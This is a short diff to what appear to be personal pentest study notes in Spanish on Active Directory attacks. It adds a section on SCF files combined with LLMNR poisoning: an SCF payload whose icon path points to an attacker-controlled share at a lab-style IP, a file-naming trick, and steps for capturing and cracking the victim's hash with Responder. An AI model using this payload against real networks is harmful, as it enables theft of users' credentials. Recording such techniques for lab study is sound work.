@@ -16,3 +16,15 @@
 
 
 [a medium post](https://stridergearhead.medium.com/llmnr-poisoning-an-ad-attack-1265f5365332)
+
+## SCF + LLMNR poisoning
+- Primero creamos un artchivo SCF con el siguiente contenido:
+```[Shell]
+Command=2
+IconFile=\\10.10.14.3\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+- El nombre del archivo tiene que ser algo como `@Inventory.scf`.
+- Este archivo lo tenemos que poner en un share que sea accesible por la victima.
+- Luego, con responder capturamos el hash de la victima y lo crackeamos.
